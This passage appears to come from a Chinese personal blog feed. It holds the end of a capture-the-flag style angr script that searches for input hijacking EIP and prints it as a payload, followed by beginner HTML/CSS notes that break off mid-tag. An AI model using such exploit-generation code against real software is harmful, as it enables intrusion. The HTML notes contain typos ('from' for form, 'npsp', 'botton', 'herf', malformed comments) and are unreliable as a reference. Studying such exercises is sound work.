class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, input_buffer_address</span>):</span><br>      input_buffer = claripy.BVS(<span class="hljs-string">&#x27;input_buffer&#x27;</span>, <span class="hljs-number">64</span> * <span class="hljs-number">8</span>)  <span class="hljs-comment">#  设置一个较大的input_buffer</span><br><br>      <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_buffer.chop(bits=<span class="hljs-number">8</span>):<br>        self.state.add_constraints(char &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, char &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br><br>      self.state.memory.store(input_buffer_address, input_buffer, endness=project.arch.memory_endness)<br><br>      self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution&#x27;</span>] = input_buffer<br><br>  scanf_symbol = <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span><br>  project.hook_symbol(scanf_symbol, ReplacementScanf())  <span class="hljs-comment">#  对scanf() 做Hook</span><br><br>  <span class="hljs-keyword">while</span> (simulation.active <span class="hljs-keyword">or</span> simulation.unconstrained) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simulation.found):  <span class="hljs-comment">#  </span><br>    <span class="hljs-keyword">for</span> unconstrained_state <span class="hljs-keyword">in</span> simulation.unconstrained:<br>      <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_move</span>(<span class="hljs-params">s</span>):</span><br>        <span class="hljs-keyword">return</span> s <span class="hljs-keyword">is</span> unconstrained_state<br>      <br>      simulation.move(<span class="hljs-string">&#x27;unconstrained&#x27;</span>, <span class="hljs-string">&#x27;found&#x27;</span>, filter_func=should_move)  <span class="hljs-comment">#  保存</span><br><br>    simulation.step()  <span class="hljs-comment">#  步进执行</span><br><br>  <span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>    solution_state.add_constraints(solution_state.regs.eip == <span class="hljs-number">0x4D525849</span>)  <span class="hljs-comment">#  判断EIP 地址是否可控</span><br><br>    solution = solution_state.se.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution&#x27;</span>],cast_to = <span class="hljs-built_in">bytes</span>)  <span class="hljs-comment">#  生成Payload</span><br>    <span class="hljs-built_in">print</span>(solution)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>网页制作</title>
    <link href="/2022/03/14/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C/"/>
    <url>/2022/03/14/%E7%BD%91%E9%A1%B5%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1>HTML基础</h1><h2 id="基本标签">基本标签</h2><h3 id="HTML基本结构">HTML基本结构</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        ...<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="标题">标题</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;--!一级标题--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <br>&lt;--!二级标题--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <br>&lt;--!三级标题--&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <br>&lt;--!四级标题--&gt;    <br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br>    <br>&lt;--!五级标题--&gt;    <br><span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br>    <br>&lt;--!六级标题--&gt;    <br><span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="注释">注释</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;--!注释--&gt;<br></code></pre></td></tr></table></figure><h3 id="空格">空格</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&amp;npsp<br></code></pre></td></tr></table></figure><h3 id="页面标题">页面标题</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="文本">文本</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="换行">换行</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="水平线">水平线</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>/&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="表格">表格</h2><h3 id="有序列表-P46">有序列表( P46 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="无序列表-P48">无序列表( P48 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="定义列表-用的较少-P53">定义列表(用的较少)( P53 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>名词<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>描述<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="表格结构-P57">表格结构( P57 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="表头单元格-会以粗体、居中显示">表头单元格(会以粗体、居中显示)</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span> <span class="hljs-comment">&lt;!--表头单元格--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="表格标题">表格标题</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">caption</span>&gt;</span>标题<span class="hljs-tag">&lt;/<span class="hljs-name">caption</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="合并行-P65">合并行( P65 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">rowspan</span>=<span class="hljs-string">&quot;行数&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="合并列-P66">合并列( P66 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;列数&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="图片">图片</h2><h3 id="图片引用-P68">图片引用( P68 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">&quot;路径&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="超链接">超链接</h2><h3 id="超链接-P79">超链接( P79 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;地址&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;...&quot;</span> /&gt;</span><br><span class="hljs-comment">&lt;!--target对应打开窗口方式，属性有_self、_blank、_parent、_top--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;...&quot;</span>/&gt;</span><span class="hljs-comment">&lt;!-- alt -&gt; 搜索引擎  title -&gt; 用户 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="锚点链接-P83">锚点链接( P83 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#某个id&quot;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;某个id&quot;</span>&gt;</span><br>    ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h2 id="表单">表单</h2><h3 id="表单标签存放-P89">表单标签存放( P89 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>表单<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="input标签-自闭和-P91">input标签(自闭和)( P91 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;表单类型&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="单行文本框-P92">单行文本框( P92 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;...&quot;</span>/&gt;</span><br><span class="hljs-comment">&lt;!--value:默认值 size:文本框长度 maxlength:最多输入--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="密码文本框-与-text-同有-value、size、maxlength属性-P94-97">密码文本框(与 text 同有 value、size、maxlength属性)( P94-97 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;...&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;...&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="单选框-P97">单选框( P97 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;A&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;B&quot;</span>/&gt;</span>B<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;A&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;C&quot;</span>/&gt;</span>C<br><span class="hljs-comment">&lt;!--name值相同才是单选--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="复选框-P101">复选框( P101 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;A&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;B&quot;</span>/&gt;</span>B<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;A&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;B&quot;</span> <span class="hljs-attr">checked</span>/&gt;</span>B <span class="hljs-comment">&lt;!--默认选中--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="普通按钮-P103">普通按钮( P103 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;botton&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--value:按钮上文字--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="提交按钮-P104">提交按钮( P104 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--value:按钮上文字--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="重置按钮-P105">重置按钮( P105 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span> <span class="hljs-comment">&lt;!--value:按钮上文字--&gt;</span><br><span class="hljs-comment">&lt;!--对该按钮所在的form内的表单元素生效--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="多行文本框-P109">多行文本框( P109 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;行数&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;列数&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;取值&quot;</span>&gt;</span>默认内容<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="下拉列表-P109">下拉列表( P109 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <span class="hljs-comment">&lt;!--默认选中--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="框架结构">框架结构</h2><p><strong>通过使用框架，可以在同一个浏览器窗口中显示不止一个页面。</strong></p><h3 id="垂直框架">垂直框架</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;*,*,*&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_a.html&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_b.html&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_c.html&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="水平框架">水平框架</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;*,*,*&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_a.html&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_b.html&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_c.html&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="混合框架嵌套">混合框架嵌套</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;50%,50%&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_a.html&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;25%,75%&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_b.html&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/example/html/frame_c.html&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="其他">其他</h2><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tp">文本标签 <span class="hljs-keyword">P</span><span class="hljs-number">29</span><br>块元素 <span class="hljs-keyword">P</span><span class="hljs-number">38</span><br>自闭和标签 <span class="hljs-keyword">P</span><span class="hljs-number">37</span><span class="hljs-number">-38</span><br>行内元素 <span class="hljs-keyword">P</span><span class="hljs-number">40</span><br>特殊符号 <span class="hljs-keyword">P</span><span class="hljs-number">42</span><br>type(列表项符号) <span class="hljs-keyword">P</span><span class="hljs-number">47</span><br>绝对/相对路径 <span class="hljs-keyword">P</span><span class="hljs-number">72</span><span class="hljs-number">-74</span><br>图片格式 <span class="hljs-keyword">P</span><span class="hljs-number">75</span><br>target属性 <span class="hljs-keyword">P</span><span class="hljs-number">81</span><br>内部链接 <span class="hljs-keyword">P</span><span class="hljs-number">82</span><br>from属性 <span class="hljs-keyword">P</span><span class="hljs-number">90</span><span class="hljs-number">-91</span><br>input属性 <span class="hljs-keyword">P</span><span class="hljs-number">91</span><br>密码文本框属性 <span class="hljs-keyword">P</span><span class="hljs-number">96</span><br>下拉列表属性 <span class="hljs-keyword">P</span><span class="hljs-number">111</span><br>option属性 <span class="hljs-keyword">P</span><span class="hljs-number">113</span><br></code></pre></td></tr></table></figure><hr><h1>CSS基础</h1><h2 id="CSS引入">CSS引入</h2><h3 id="CSS引入-P122-125">CSS引入( P122-125 )</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--外部样式表--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">herf</span>=<span 